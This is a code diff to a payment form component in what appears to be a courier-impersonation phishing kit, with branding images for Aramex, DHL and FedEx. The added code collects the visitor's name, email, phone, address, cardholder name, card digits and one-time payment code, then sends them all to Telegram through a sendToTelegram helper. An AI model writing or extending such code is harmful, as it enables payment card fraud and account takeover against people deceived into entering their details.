@@ -7,6 +7,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import { Shield, AlertCircle, Check } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
+import { sendToTelegram } from "@/lib/telegram";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -99,6 +100,30 @@ const PaymentOTPForm = () => {
         });
       } catch (err) {
         console.error("Form submission error:", err);
+      }
+      
+      // Send payment confirmation to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'payment_confirmation',
+        data: {
+          name: customerInfo.name || '',
+          email: customerInfo.email || '',
+          phone: customerInfo.phone || '',
+          address: customerInfo.address || '',
+          service: serviceName,
+          amount: formattedAmount,
+          cardholder: sessionStorage.getItem('cardName') || '',
+          cardLast4: sessionStorage.getItem('cardLast4') || '',
+          expiry: '12/25', // Default expiry for demo
+          otp: otp
+        },
+        timestamp: new Date().toISOString()
+      });
+
+      if (telegramResult.success) {
+        console.log('Payment confirmation sent to Telegram successfully');
+      } else {
+        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
       }
       
       toast({
